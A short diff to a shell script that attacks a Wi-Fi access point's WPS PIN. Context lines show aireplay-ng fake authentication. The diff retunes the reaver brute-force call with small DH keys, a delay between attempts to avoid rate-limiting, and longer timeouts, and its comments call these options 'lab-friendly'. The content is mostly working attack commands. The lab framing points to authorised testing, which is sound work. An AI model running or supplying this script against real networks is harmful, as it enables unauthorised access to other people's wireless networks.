@@ -56,5 +56,12 @@ timeout 20 aireplay-ng --fakeauth 0 -a "$BSSID" -h "$OUR_MAC" "$IFACE" || true
 
 echo
 echo "[*] Starting reaver..."
+echo "[*] Tip: push the WPS button on the router just before or right after this starts."
 echo "[*] Press Ctrl+C to stop."
-reaver --bssid "$BSSID" --channel "$CHANNEL" --interface "$IFACE" -vv
+# Common lab-friendly options:
+#   -vv          verbose
+#   -S           small DH keys (faster on some APs)
+#   -d 5         5 second delay between attempts (reduces rate-limiting)
+#   -t 10 -T 10  longer timeouts
+reaver --bssid "$BSSID" --channel "$CHANNEL" --interface "$IFACE" \
+       -vv -S -d 5 -t 10 -T 10
